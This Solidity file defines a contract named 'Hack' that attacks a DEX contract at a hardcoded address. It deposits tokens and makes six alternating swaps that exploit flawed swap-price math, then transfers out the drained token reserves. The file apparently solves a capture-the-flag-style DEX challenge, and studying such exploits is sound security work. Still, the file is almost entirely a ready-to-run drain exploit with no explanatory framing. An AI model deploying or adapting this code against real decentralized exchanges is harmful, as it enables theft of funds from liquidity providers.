// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function setTokens(address _token1, address _token2) external;

    function addLiquidity(address token_address, uint256 amount) external;

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);

    function renounceOwnership() external;

    function transferOwnership(address newOwner) external;

    function owner() external view returns (address);
}

contract Hack {
    IDex private immutable target =
        IDex(0xa54674A7eBa777b8244b068c4e299249A5BD962B);

    function attack() external {
        // use target.approve(address(this), 10) on the remix gui
        address token1 = target.token1();
        address token2 = target.token2();

        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);

        target.approve(address(target), 1000);

        target.swap(token1, token2, 10);
        target.swap(token2, token1, 20);
        target.swap(token1, token2, 24);
        target.swap(token2, token1, 30);
        target.swap(token1, token2, 41);
        target.swap(token2, token1, 45);

        target.approve(address(this), 1000);
        IERC20(token1).transferFrom(
            address(this),
            msg.sender,
            target.balanceOf(token1, address(this))
        );
        IERC20(token2).transferFrom(
            address(this),
            msg.sender,
            target.balanceOf(token2, address(this))
        );
    }
}
